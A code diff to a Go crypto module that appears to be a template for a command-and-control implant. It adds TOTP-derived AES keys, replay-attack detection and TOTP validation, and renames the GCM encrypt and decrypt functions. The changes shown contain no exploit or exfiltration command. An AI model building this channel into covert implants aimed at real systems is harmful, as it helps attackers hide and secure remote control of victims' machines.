@@ -32,6 +32,7 @@ import (
 	"errors"
 	"io"
 	"os"
+	"sync"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -51,7 +52,19 @@ const (
 )
 
 var (
+	// CACertPEM - PEM encoded CA certificate
 	CACertPEM = `{{.Config.CACert}}`
+
+	totpSecret  = "{{ .OTPSecret }}"
+	totpOptions = totp.ValidateOpts{
+		Digits:    8,
+		Algorithm: otp.AlgorithmSHA256,
+		Period:    uint(30),
+		Skew:      uint(1),
+	}
+
+	// ErrReplayAttack - Replay attack
+	ErrReplayAttack = errors.New("replay attack detected")
 )
 
 // AESKey - 128 bit key
@@ -108,8 +121,8 @@ func RSADecrypt(ciphertext []byte, privateKey *rsa.PrivateKey) ([]byte, error) {
 	return plaintext, nil
 }
 
-// GCMEncrypt - Encrypt using AES GCM
-func GCMEncrypt(key AESKey, plaintext []byte) ([]byte, error) {
+// AESEncrypt - Encrypt using AES GCM
+func AESEncrypt(key AESKey, plaintext []byte) ([]byte, error) {
 	block, _ := aes.NewCipher(key[:])
 	nonce := make([]byte, GCMNonceSize)
 	if _, err := io.ReadFull(secureRand.Reader, nonce); err != nil {
@@ -126,8 +139,8 @@ func GCMEncrypt(key AESKey, plaintext []byte) ([]byte, error) {
 	return ciphertext, nil
 }
 
-// GCMDecrypt - Decrypt GCM ciphertext
-func GCMDecrypt(key AESKey, ciphertext []byte) ([]byte, error) {
+// AESDecrypt - Decrypt GCM ciphertext
+func AESDecrypt(key AESKey, ciphertext []byte) ([]byte, error) {
 	if len(ciphertext) < GCMNonceSize+1 {
 		return nil, errors.New("[[GenerateCanary]]")
 	}
@@ -140,19 +153,74 @@ func GCMDecrypt(key AESKey, ciphertext []byte) ([]byte, error) {
 	return plaintext, nil
 }
 
+// PeerAESKey - Translate an otp into a peer key
+func PeerAESKey(otp string) AESKey {
+	digest := sha256.New()
+	digest.Write([]byte(totpSecret + otp))
+	var peerKey AESKey
+	copy(peerKey[:], digest.Sum(nil)[:AESKeySize])
+	return peerKey
+}
+
+// NewCipherContext - Wrapper around creating a cipher context from a key
+func NewCipherContext(key AESKey) *CipherContext {
+	return &CipherContext{
+		Key:    key,
+		replay: &sync.Map{},
+	}
+}
+
+// CipherContext - Tracks a series of messages encrypted under the same key
+// and detects/prevents replay attacks.
+type CipherContext struct {
+	Key    AESKey
+	replay *sync.Map
+}
+
+// Decrypt - Decrypt a message with the contextual key and check for replay attacks
+func (c *CipherContext) Decrypt(data []byte) ([]byte, error) {
+	digest := sha256.New()
+	digest.Write(data)
+	if _, ok := c.replay.LoadOrStore(digest.Sum(nil), true); ok {
+		return nil, ErrReplayAttack
+	}
+	plaintext, err := AESDecrypt(c.Key, data)
+	if err != nil {
+		return nil, err
+	}
+	return plaintext, nil
+}
+
+// Encrypt - Encrypt a message with the contextual key
+func (c *CipherContext) Encrypt(plaintext []byte) ([]byte, error) {
+	ciphertext, err := AESEncrypt(c.Key, plaintext)
+	if err != nil {
+		return nil, err
+	}
+	digest := sha256.New()
+	digest.Write(ciphertext)
+	c.replay.Store(digest.Sum(nil), true)
+	return ciphertext, nil
+}
+
+// GetOTPCode - Get the current OTP code
 func GetOTPCode() string {
 	now := time.Now().UTC()
-	opts := totp.ValidateOpts{
-		Digits:    8,
-		Algorithm: otp.AlgorithmSHA256,
-		Period:    uint(30),
-		Skew:      uint(1),
-	}
-	code, _ := totp.GenerateCodeCustom("{{ .OTPSecret }}", now, opts)
+	code, _ := totp.GenerateCodeCustom(totpSecret, now, totpOptions)
 	// {{if .Config.Debug}}
 	log.Printf("TOTP Code: %s", code)
 	// {{end}}
 	return code
+}
+
+// ValidateTOTP - Validate a TOTP code
+func ValidateTOTP(code string) (bool, error) {
+	now := time.Now().UTC()
+	valid, err := totp.ValidateCustom(code, totpSecret, now, totpOptions)
+	if err != nil {
+		return false, err
+	}
+	return valid, nil
 }
 
 // rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
